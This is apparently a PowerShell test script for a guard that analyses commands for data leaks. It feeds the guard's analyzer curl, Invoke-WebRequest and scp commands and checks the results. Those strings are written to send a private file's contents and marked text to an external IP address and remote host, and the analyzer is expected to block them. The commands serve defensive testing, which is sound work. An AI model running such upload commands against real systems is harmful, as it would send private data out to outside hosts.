#Requires -Version 7.0
[CmdletBinding()]
param([string]$WorkRoot = (Join-Path $PSScriptRoot '..\build\rule-test-work'))
$ErrorActionPreference = 'Stop'
$root = (Resolve-Path -LiteralPath (Split-Path -Parent $PSScriptRoot)).Path
[IO.Directory]::CreateDirectory($WorkRoot) | Out-Null
$work = (Resolve-Path -LiteralPath $WorkRoot).Path
$fixture = Join-Path $work ([guid]::NewGuid().ToString('N'))
$settings = Join-Path $fixture 'config'
$files = Join-Path $fixture 'files'
$build = Join-Path $fixture 'bridge'
foreach ($directory in $settings,$files,$build) { [IO.Directory]::CreateDirectory($directory) | Out-Null }
$oldCli = $env:DOTNET_CLI_HOME
$env:DOTNET_CLI_HOME = Join-Path $work 'dotnet-home'
$runspace = $null
try {
    $inputFile = Join-Path $files 'private.txt'
    $copy = Join-Path $files 'copy.txt'
    $folder = Join-Path $files 'protected'
    $sibling = Join-Path $files 'protected-old'
    foreach ($dir in $folder, $sibling) { [IO.Directory]::CreateDirectory($dir) | Out-Null }
    [IO.File]::WriteAllText($inputFile,'private body without text markers')
    [IO.File]::WriteAllText((Join-Path $folder 'a.txt'),'folder-independent-content')
    [IO.File]::WriteAllText((Join-Path $sibling 'a.txt'),'folder-independent-content')
    $config = Join-Path $settings sensitive.toml
    @"
version = 1
[policy]
on_missing = "warn"
trust_loopback = true
max_files_per_scan = 80
max_file_bytes = 196608
file_scan_budget_ms = 1500

# hands-off-comment
[[rules]]
id = "file-policy"
action = "block"
files = ['$inputFile', '\\nonexistent-guard-fixture.invalid\share\restricted.txt']
folders = ['$folder']
texts = []

[[rules]]
id = "sensitive-text"
action = "block"
texts = [
  'fixture-sensitive-xyz', # multi-line string array
]

[[rules]]
id = "warn-only"
action = "warn"
texts = ["fixture-warning"]
"@ | Set-Content -LiteralPath $config -Encoding utf8
    $crowded = foreach ($i in (1..38)) {
        "[[rules]]`nid = 'stress-warn-$i'`naction = 'warn'`ntexts = ['fixture-shared-marker']`n"
    }
    $crowded += "[[rules]]`nid = 'stress-block-last'`naction = 'block'`ntexts = ['fixture-shared-marker']`n"
    Add-Content -LiteralPath $config -Value ($crowded -join [Environment]::NewLine)
    $result = & dotnet build (Join-Path $root 'src\analysis\GuardAst.csproj') -c Release -o $build "-p:BaseIntermediateOutputPath=$build/obj/" "-p:GuardPolicyRoot=$fixture" -p:NuGetAudit=false 2>&1
    if ($LASTEXITCODE -ne 0) { throw ($result -join [Environment]::NewLine) }
    Add-Type -TypeDefinition @'
using System;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Loader;
public static class SensitiveRuleFixture {
    [StructLayout(LayoutKind.Sequential)] struct Request { public IntPtr Source, Output; public int Length, Capacity, Decision; }
    static Type bridge;
    public static void Init(string path) {
        using var content = new MemoryStream(File.ReadAllBytes(path));
        bridge = new AssemblyLoadContext("PolicyFixture", false).LoadFromStream(content).GetType("PowerShell7Guard.AstBridge", true);
    }
    public static string Scan(string text, int capacity) {
        var source=Marshal.StringToHGlobalUni(text);
        var output=Marshal.AllocHGlobal(capacity);
        var size=Marshal.SizeOf<Request>();
        var data=Marshal.AllocHGlobal(size);
        try {
            Marshal.StructureToPtr(new Request{Source=source, Output=output, Length=text.Length, Capacity=capacity, Decision=-1},data,false);
            var count=(int)bridge.GetMethod("Analyze").Invoke(null,new object[]{data,size});
            if(count==-2)
                return "{\"decision\":"+Marshal.PtrToStructure<Request>(data).Decision+",\"report\":{\"status\":\"external-using-skipped\"}}";
            if(count<=0) throw new Exception("bridge status "+count);
            return "{\"decision\":"+Marshal.PtrToStructure<Request>(data).Decision+",\"report\":"+Marshal.PtrToStringUTF8(output,count)+"}";
        } finally { Marshal.FreeHGlobal(data); Marshal.FreeHGlobal(source); Marshal.FreeHGlobal(output); }
    }
    public static bool VerifyReadOnlyMachineEnvironment() {
        var env=bridge.GetNestedType("DurableEnv",BindingFlags.NonPublic);
        var args=new object[]{"machine","Path",null,null};
        var ok=(bool)env.GetMethod("Read",BindingFlags.Static|BindingFlags.NonPublic).Invoke(null,args);
        return ok && !String.IsNullOrEmpty(args[3] as string) &&
            Object.Equals(args[2], Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine));
    }
    public static bool CommitDurableFixture() {
        var flags=BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance;
        var mark=bridge.GetNestedType("Mark",BindingFlags.NonPublic);
        var tag=Activator.CreateInstance(mark,flags,null,new object[]{"file-policy","fixture source","fixture route"},null);
        var tags=Array.CreateInstance(mark,1);
        tags.SetValue(tag,0);
        var store=bridge.GetNestedType("Store",BindingFlags.NonPublic);
        return (bool)store.GetMethod("SavePersistent",flags).Invoke(null,
            new object[]{"user","fixture-owner","FLOW_ONLY","fixture-stamp",tags,"fixture-test"});
    }
}
'@
    [SensitiveRuleFixture]::Init((Join-Path $build 'PowerShell7Guard.Ast.dll'))
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $runspace.SessionStateProxy.Path.SetLocation($files) | Out-Null
    function Scan([string]$text,[switch]$ExecuteLocal,[int]$ReportCapacity=192KB) {
        $p = [powershell]::Create()
        try {
            $p.Runspace = $runspace
            $code = 'param($text,$capacity); [SensitiveRuleFixture]::Scan($text,$capacity)'
            if ($ExecuteLocal) { $code += '; ' + $text }
            $null = $p.AddScript($code,$false).AddArgument($text).AddArgument($ReportCapacity)
            $out = $p.Invoke()
            if ($p.HadErrors -or $out.Count -ne 1) { throw ("Pipeline failed: " + ($p.Streams.Error -join ', ')) }
            $out[0].ToString() | ConvertFrom-Json -AsHashtable
        } finally { $p.Dispose() }
    }
    function Is([int]$n,$event,[string]$label) {
        if ($event.decision -ne $n) { throw "$label expected $n : $($event.report | ConvertTo-Json -Depth 8 -Compress)" }
    }
    function Await-Config([string]$needle,[bool]$want=$true) {
        $end=[DateTime]::UtcNow.AddSeconds(4)
        do {
            try {
                $f=[IO.File]::Open($config,'Open','Read','ReadWrite,Delete')
                $r=[IO.StreamReader]::new($f)
                try { $current=$r.ReadToEnd() } finally { $r.Dispose() }
                if ($current.Contains($needle) -eq $want) { Start-Sleep -Milliseconds 120; return }
            } catch [IO.IOException] {}
            Start-Sleep -Milliseconds 40
        } while([DateTime]::UtcNow -lt $end)
        throw "Expected config content '$needle' present=$want"
    }
    $remote='scp://user@124.223.64.165:8080/incoming/'
    $endpoint='http://124.223.64.165:8080/'
    Is 0 (Scan '$global:fixtureFlow = Get-Content -Raw -LiteralPath ''private.txt''' -ExecuteLocal) 'local read'
    $fromVar=Scan "curl.exe --data-binary `$global:fixtureFlow '$endpoint'"
    Is 1 $fromVar 'curl input from variable'
    if (($fromVar.report.policy.evidence[0].flow[0].route) -notmatch 'private\.txt.*fixtureFlow.*curl') { throw 'Missing provenance' }
    Is 1 (Scan "Write-Output `$global:fixtureFlow | curl.exe --data-binary '@-' '$endpoint'") 'stdin upload'
    Is 1 (Scan "curl.exe --data-binary 'fixture-sensitive-xyz' '$endpoint'") 'text'
    $external = 'http://124.223.64.165:8080/'
    Is 1 (Scan "Invoke-WebRequest -Method Post -Uri '$external' -Body 'fixture-sensitive-xyz'") 'external address remains blockable'
    function Post([string]$body) { "Invoke-WebRequest -Method Post -Uri '$external' -Body $body" }
    $generated = 0
    foreach ($length in 0,9,256,4096,16384,30000) {
        $prefix = if ($length % 2 -eq 0) { '中' * $length } else { 'x' * $length }
        Is 1 (Scan (Post "'${prefix}fixture-sensitive-xyz'")) "sensitive body length $length"
        Is 2 (Scan (Post "'${prefix}ordinary'")) "clean body length $length"
        $generated += 2
    }
    Is 1 (Scan (Post "'using PowerShell to send fixture-sensitive-xyz'")) 'literal using is not a directive'
    Is 1 (Scan ("# using assembly example" + [Environment]::NewLine + (Post "'fixture-sensitive-xyz'"))) 'comment using is not a directive'
    $directive = Scan ("using assembly 'Q:\guard-fixture-must-not-load.dll'" + [Environment]::NewLine + (Post "'fixture-sensitive-xyz'"))
    Is 1 $directive 'potentially external assembly directive warns'
    if ($directive.report.status -ne 'external-using-isolated') { throw 'External directive was not isolated' }
    Is 1 (Scan (Post "('fixture-' + 'sensitive-xyz')")) 'strongly typed literal concatenation'
    Is 2 (Scan (Post "('ordinary' + ' text')")) 'clean concatenation'
    Is 3 (Scan (Post "('fixture-' + `$unknownValue)")) 'dynamic concatenation warns'
    Is 1 (Scan ((Post "'fixture-sensitive-xyz'") + ' -TimeoutSec 3 -ErrorAction Stop')) 'standard transport options'
    Is 3 (Scan ((Post "'fixture-sensitive-xyz'") + ' -TimeoutSec -1')) 'invalid timeout'
    Is 1 (Scan ((Post "'ordinary'") + '; if ($true) { ' + (Post "'fixture-sensitive-xyz'") + ' }')) 'literal true branch after a known clean send'
    $crowdedCase = Scan (Post "'fixture-shared-marker'")
    Is 1 $crowdedCase 'a block rule must not be hidden behind 38 warn rules'
    if ($crowdedCase.report.policy.decision -ne 'block:stress-block-last' -or
        $crowdedCase.report.policy.evidence[0].matchedRules -ne 39) { throw 'Wrong decisive rule or missing matches' }
    foreach ($assignments in 31,32,64,128,240) {
        $setup = (1..$assignments | ForEach-Object { '$temp' + $_ + " = 'ordinary'" }) -join '; '
        Is 1 (Scan ($setup + '; ' + (Post "'fixture-sensitive-xyz'"))) "late send after $assignments assignments"
        $generated++
    }
    $over = (1..300 | ForEach-Object { '$temp' + $_ + " = 'ordinary'" }) -join '; '
    Is 3 (Scan ($over + '; ' + (Post "'fixture-sensitive-xyz'"))) 'analysis limit is an explicit warning'
    $bigReport = (1..48 | ForEach-Object { '$large' + $_ + " = '" + ('中' * 450) + "'; " }) -join ''
    $limited = Scan ($bigReport + (Post "'fixture-sensitive-xyz'")) -ReportCapacity 4096
    Is 1 $limited 'large log must not hide the decision'
    if ($limited.report.truncation -ne 'report-output-limit' -or
        $limited.report.policy.decision -ne 'block:sensitive-text' -or -not $limited.report.policy.evidence) {
        throw 'Decisive evidence was lost'
    }
    "PASS: $($generated + 12) generated length, syntax, confidence and analysis-limit cases."
    foreach ($localUrl in 'http://127.0.0.1:8080/','http://127.4.3.2:8080/','http://[::1]:8080/',
        'http://[::ffff:127.0.0.1]:8080/','http://localhost:8080/','http://localhost.:8080/') {
        foreach ($command in "Invoke-RestMethod -Method Post -Uri '$localUrl' -MaximumRedirection 0 -Body 'fixture-sensitive-xyz'",
            "curl.exe --data-binary 'fixture-sensitive-xyz' '$localUrl'") {
            $local = Scan $command
            Is 2 $local 'loopback is excluded'
            if ($local.report.policy.decision -ne 'skip:loopback') { throw 'Missing loopback reason' }
        }
    }
    foreach ($notLocal in 'http://localhost.example.invalid/','http://127.0.0.1.example.invalid/','http://192.168.0.1/') {
        Is 1 (Scan "curl.exe --data-binary 'fixture-sensitive-xyz' '$notLocal'") 'not loopback'
    }
    Is 5 (Scan "curl.exe --data-binary 'fixture-warning' '$endpoint'") 'warning action'
    Is 3 (Scan "curl.exe --data-binary `$undefinedFixture '$endpoint'") 'unknown payload'
    Is 0 (Scan "curl.exe -o 'download.txt' '$endpoint'") 'download'
    Is 1 (Scan "scp.exe 'protected\a.txt' '$remote'") 'folder'
    Is 2 (Scan "scp.exe 'protected\a.txt' 'user@127.0.0.1:/incoming/'") 'loopback scp'
    Is 2 (Scan "scp.exe 'protected\a.txt' 'user@[::1]:/incoming/'") 'IPv6 loopback scp'
    Is 2 (Scan "scp.exe 'protected-old\a.txt' '$remote'") 'sibling folder not sensitive'
    Is 0 (Scan "scp.exe '$remote' 'private.txt'") 'scp download'
    Is 1 (Scan "scp.exe -r 'protected' '$remote'") 'recursive set contains protected files'
    Is 3 (Scan 'git push origin refs/heads/main:refs/heads/main') 'no Git baseline'
    Is 0 (Scan 'Set-Content -LiteralPath ''derived.txt'' -Value $global:fixtureFlow -NoNewline' -ExecuteLocal) 'write'
    Is 1 (Scan "scp.exe 'derived.txt' '$remote'") 'derived file immediately after pipeline'
    # Keep a second process alive across the write. No config polling or sleeps.
    $peerStart=[Diagnostics.ProcessStartInfo]::new()
    $peerStart.FileName=[Environment]::ProcessPath
    $peerStart.UseShellExecute=$false
    $peerStart.RedirectStandardInput=$true
    $peerStart.RedirectStandardOutput=$true
    $peerStart.RedirectStandardError=$true
    $peerStart.CreateNoWindow=$true
    foreach($arg in @('-NoProfile','-NonInteractive','-File',(Join-Path $PSScriptRoot 'Scan-PolicyPeer.ps1'),
        (Join-Path $build 'PowerShell7Guard.Ast.dll'),$files)){ $peerStart.ArgumentList.Add($arg) }
    $peer=[Diagnostics.Process]::Start($peerStart)
    try {
        function PeerDecision([string]$cmd) {
            $peer.StandardInput.WriteLine($cmd)
            $peer.StandardInput.Flush()
            $line=$peer.StandardOutput.ReadLineAsync()
            if (-not $line.Wait(15000) -or $null -eq $line.Result) { throw 'Peer scanner failed to respond' }
            [int]$line.Result
        }
        $peerSource = Join-Path $files 'peer-derived.txt'
        [IO.File]::WriteAllText($peerSource,'ordinary')
        $peerSend = "scp.exe '$peerSource' '$remote'"
        if ((PeerDecision $peerSend) -ne 2) { throw 'Peer warm-up expected no match' }
        Is 0 (Scan 'Copy-Item -LiteralPath private.txt -Destination peer-derived.txt' -ExecuteLocal) 'peer copy'
        if ((PeerDecision $peerSend) -ne 1) { throw 'Warm peer did not see the committed file label' }
        if ((PeerDecision ':persistent-fixture') -ne 0) { throw 'Peer durable warm-up expected empty metadata' }
        if (-not [SensitiveRuleFixture]::CommitDurableFixture()) { throw 'Peer durable fixture commit failed' }
        if ((PeerDecision ':persistent-fixture') -ne 1) { throw 'Warm peer did not see the durable label' }
        'PASS: warmed separate PowerShell process sees confirmed file and durable metadata immediately.'
    } finally {
        $peer.StandardInput.Close()
        if (-not $peer.WaitForExit(5000)) { $peer.Kill() }
        $peer.Dispose()
    }
    Await-Config 'derived.txt'
    Is 0 (Scan 'Copy-Item -LiteralPath ''derived.txt'' -Destination ''copy.txt''' -ExecuteLocal) 'copy'
    Await-Config 'copy.txt'
    Is 1 (Scan "scp.exe 'copy.txt' '$remote'") 'derived copy'
    [IO.File]::WriteAllText($copy,'unrelated and different')
    Is 3 (Scan "scp.exe 'copy.txt' '$remote'") 'stale copy witness'
    Is 0 (Scan 'Set-Content -LiteralPath ''copy.txt'' -Value ''known clean'' -NoNewline' -ExecuteLocal) 'overwrite'
    Await-Config 'copy.txt' $false
    Is 2 (Scan "scp.exe 'copy.txt' '$remote'") 'confirmed replacement'
    if (-not ([IO.File]::ReadAllText($config).Contains('# hands-off-comment'))) { throw 'Changed hand-written TOML' }
    Is 1 (Scan "Copy-Item 'private.txt' 'should-not-exist.txt'; scp.exe 'private.txt' '$remote'") 'blocked plan'
    if ((Test-Path (Join-Path $files 'should-not-exist.txt')) -or [IO.File]::ReadAllText($config).Contains('should-not-exist.txt')) {
        throw 'Blocked plan committed state'
    }
    Is 1 (Scan "Copy-Item 'private.txt' 'just-planned.txt'; scp.exe 'just-planned.txt' '$remote'") 'same-script planned copy'
    if ((Test-Path (Join-Path $files 'just-planned.txt')) -or [IO.File]::ReadAllText($config).Contains('just-planned.txt')) {
        throw 'Same-script proof was accidentally persisted'
    }
    if (-not [SensitiveRuleFixture]::CommitDurableFixture()) { throw 'Persistent metadata write failed' }
    if (-not [SensitiveRuleFixture]::VerifyReadOnlyMachineEnvironment()) { throw 'Could not verify read-only Machine environment witness' }
    $persistent = [IO.File]::ReadAllText((Join-Path $fixture 'state\persistent-variables.toml'))
    if ($persistent -notmatch 'fixture-owner' -or $persistent -match 'private body') { throw 'Invalid persisted metadata' }
    'PASS: TOML, variable/stdin/file flow, verified and stale copies, warning, upload/download, durable metadata, read-only Machine environment.'
    . (Join-Path $PSScriptRoot 'Stress-ContentCases.ps1')
    . (Join-Path $PSScriptRoot 'Test-FlowModels.ps1')
    . (Join-Path $PSScriptRoot 'Test-NativeTransfers.ps1')
    . (Join-Path $PSScriptRoot 'Test-SecurityTodo.ps1')
    . (Join-Path $PSScriptRoot 'Test-GuardRegressions.ps1')
    . (Join-Path $PSScriptRoot 'Test-FileInspection.ps1')

    $git = (Get-Command git.exe -CommandType Application -ErrorAction Stop | Select-Object -First 1).Source
    $repo = Join-Path $fixture repo
    $bare = Join-Path $fixture baseline.git
    [IO.Directory]::CreateDirectory($repo) | Out-Null
    function G([string[]]$arguments){
        $data = & $git -C $repo @arguments 2>&1
        if ($LASTEXITCODE -ne 0) { throw ($data -join [Environment]::NewLine) }
    }
    G @('init','-b','main')
    G @('config','user.name','Guard Fixture')
    G @('config','user.email','fixture@example.invalid')
    G @('config','commit.gpgsign','false')
    [IO.File]::WriteAllText((Join-Path $repo 'README.txt'),'baseline')
    G @('add','README.txt')
    G @('commit','-m','baseline')
    Copy-Item -LiteralPath (Join-Path $repo '.git') -Destination $bare -Recurse -Force
    G @("--git-dir=$bare",'config','core.bare','true')
    G @('remote','add','origin',$bare)
    [IO.File]::WriteAllText((Join-Path $repo 'intermediate.txt'),'fixture-sensitive-xyz')
    G @('add','intermediate.txt')
    G @('commit','-m','intermediate')
    G @('rm','intermediate.txt')
    G @('commit','-m','remove sensitive file from tip')
    G @('branch','other','HEAD')
    $runspace.SessionStateProxy.Path.SetLocation($repo) | Out-Null
    Is 3 (Scan 'git push origin refs/heads/main:refs/heads/main') 'Git baseline missing'
    $report = & (Join-Path $root 'scripts\Prepare-GuardGitPush.ps1') -Remote origin -Repository $repo `
        -Refspec @('refs/heads/main:refs/heads/main','refs/heads/other:refs/heads/other') `
        -Bridge (Join-Path $build 'PowerShell7Guard.Ast.dll')
    if ($report -notmatch 'commits=2;.*matched-rules=1;.*network=False') { throw "Unexpected Git proof: $report" }
    Is 0 (Scan 'git push origin refs/heads/main:refs/heads/main refs/heads/other:refs/heads/other') 'local Git not external'
    Is 3 (Scan 'git push origin refs/heads/main:refs/heads/main') 'exact Git preflight args required'
    Is 3 (Scan 'git push origin main') 'short branch also needs a proof'
    Is 3 (Scan 'git push') 'default push requires its own proof'
    G @('config','branch.main.remote','origin')
    G @('config','branch.main.merge','refs/heads/main')
    $helper = Join-Path $root 'scripts/Prepare-GuardGitPush.ps1'
    $bridge = Join-Path $build 'PowerShell7Guard.Ast.dll'
    $short = & $helper -Remote origin -Repository $repo -Refspec main -Bridge $bridge
    if ($short -notmatch 'commits=2;.*matched-rules=1;.*network=False') { throw "Unexpected short branch Git proof: $short" }
    Is 0 (Scan 'git push origin main') 'short branch resolves to the prepared objects'
    Is 0 (Scan 'git push -u origin main') 'set-upstream does not change the prepared object set'
    Is 0 (Scan 'git push origin refs/heads/main:refs/heads/main') 'canonical refspec uses the same proof'
    $default = & $helper -Repository $repo -Bridge $bridge
    if ($default -notmatch 'commits=2;.*matched-rules=1;.*network=False') { throw "Unexpected default Git proof: $default" }
    Is 0 (Scan 'git push') 'default push resolves current branch and origin'
    G @('symbolic-ref','HEAD','refs/heads/other')
    Is 3 (Scan 'git push') 'changed HEAD invalidates the default Git proof even at the same commit'
    G @('symbolic-ref','HEAD','refs/heads/main')
    G @('config','push.default','current')
    Is 3 (Scan 'git push') 'changed push configuration invalidates previous proof'
    $default = & $helper -Repository $repo -Bridge $bridge
    if ($default -notmatch 'commits=2;.*matched-rules=1') { throw "Unexpected current-mode Git proof: $default" }
    Is 0 (Scan 'git push') 'push.default=current'
    $named = & $helper -Remote origin -Repository $repo -Bridge $bridge
    if ($named -notmatch 'commits=2;.*matched-rules=1') { throw "Unexpected named-remote proof: $named" }
    Is 0 (Scan 'git push origin') 'named remote uses resolved default refspec'
    $shortRelease = & $helper -Remote origin -Refspec 'main:release' -Repository $repo -Bridge $bridge
    if ($shortRelease -notmatch 'commits=2;.*matched-rules=1') { throw "Unexpected short destination proof: $shortRelease" }
    Is 0 (Scan 'git push origin main:release') 'validated branch destination for short refspec'
    $force = & $helper -Remote origin -Refspec main -Repository $repo -Bridge $bridge
    if ($force -notmatch 'commits=2;.*matched-rules=1') { throw "Unexpected force candidate proof: $force" }
    Is 0 (Scan 'git push --force origin main') 'force flag preserves the verified candidate object set'
    $baseOid = (& $git "--git-dir=$bare" rev-parse refs/heads/main | Select-Object -First 1)
    G @("--git-dir=$bare",'update-ref','refs/tags/release',$baseOid)
    $null = & $helper -Remote origin -Refspec 'refs/heads/main:refs/heads/release' -Repository $repo -Bridge $bridge
    Is 3 (Scan 'git push origin main:release') 'unqualified destination rejected when a tag collides'
    Is 0 (Scan 'git push origin refs/heads/main:refs/heads/release') 'qualified destination remains unambiguous'
    G @("--git-dir=$bare",'update-ref','-d','refs/tags/release')
    'PASS: named-remote default, short destination, force and ambiguous tag Git regressions.'
    G @('config','push.default','matching')
    $rejectedDefault = $false
    try { $null = & $helper -Repository $repo -Bridge $bridge } catch { $rejectedDefault = $_.Exception.ToString() -match 'default push configuration' }
    if (!$rejectedDefault) { throw 'Ambiguous/multi-branch default push was treated as a single branch.' }
    Is 3 (Scan 'git push') 'unsupported default mode has no proof'
    'PASS: short branch, set-upstream, argumentless Git proofs, and stale HEAD/config rejection.'
    G @('remote','add','loopback', 'ssh://localhost:8080/unused.git')
    $loopback = & (Join-Path $root 'scripts\Prepare-GuardGitPush.ps1') -Remote loopback -Repository $repo `
        -Refspec @('refs/heads/main:refs/heads/main') -Bridge (Join-Path $build 'PowerShell7Guard.Ast.dll')
    if ($loopback -notmatch 'commits=0;.*network=False; loopback=True') { throw "Unexpected loopback Git result: $loopback" }
    Is 2 (Scan 'git push loopback refs/heads/main:refs/heads/main') 'named loopback Git'

    G @('checkout','-b','blob-flow',$baseOid)
    $large = Join-Path $repo 'stream-blob.txt'
    [IO.File]::WriteAllText($large,('x'.PadRight(163837,'x') + 'fixture-sensitive-xyz'))
    G @('add','stream-blob.txt')
    G @('commit','-m','large fixture')
    [IO.File]::WriteAllText($large,'working tree does not contain the committed content')
    $blob = & $helper -Remote origin -Refspec blob-flow -Repository $repo -Bridge $bridge
    if ($blob -notmatch 'commits=1;.*matched-rules=1; complete=True; network=False') { throw "Unexpected large Blob proof: $blob" }
    G @('restore','--','stream-blob.txt')

    G @('checkout','-b','blob-capped',$baseOid)
    $cap = Join-Path $repo 'stream-capped.txt'
    [IO.File]::WriteAllText($cap,('x'.PadRight(163837,'x') + 'fixture-sensitive-xyz' + 'x'.PadRight(65000,'x')))
    G @('add','stream-capped.txt')
    G @('commit','-m','capped fixture with a match')
    $blob = & $helper -Remote origin -Refspec blob-capped -Repository $repo -Bridge $bridge
    if ($blob -notmatch 'commits=1;.*matched-rules=1; complete=False; network=False') { throw "Unexpected capped Blob proof: $blob" }

    G @('checkout','-b','blob-beyond',$baseOid)
    [IO.File]::WriteAllText($cap,('x'.PadRight(196608,'x') + 'fixture-sensitive-xyz'))
    G @('add','stream-capped.txt')
    G @('commit','-m','fixture with content beyond the inspection budget')
    $blob = & $helper -Remote origin -Refspec blob-beyond -Repository $repo -Bridge $bridge
    if ($blob -notmatch 'commits=1;.*matched-rules=0; complete=False; network=False') { throw "Unexpected over-budget Blob proof: $blob" }
    'PASS: Git Blob streaming, committed object vs. working tree, and confirmed hits under the byte budget.'
    'PASS: loopback and non-loopback classifications; no loopback network connection opened.'
    'PASS: local bare Git baseline, multiple refs, missing and mismatched preflight warn, deleted-at-tip file matched; no push executed.'
} finally {
    if ($runspace) { $runspace.Dispose() }
    $env:DOTNET_CLI_HOME = $oldCli
    $actual=[IO.Path]::GetFullPath($fixture)
    $parent=[IO.Path]::GetFullPath($work).TrimEnd('\') + '\'
    if ($actual.StartsWith($parent,[StringComparison]::OrdinalIgnoreCase) -and [IO.Path]::GetFileName($actual) -match '^[0-9a-f]{32}$' -and
        (Test-Path -LiteralPath $actual)) {
        Remove-Item -LiteralPath $actual -Recurse -Force -ErrorAction SilentlyContinue
    }
}
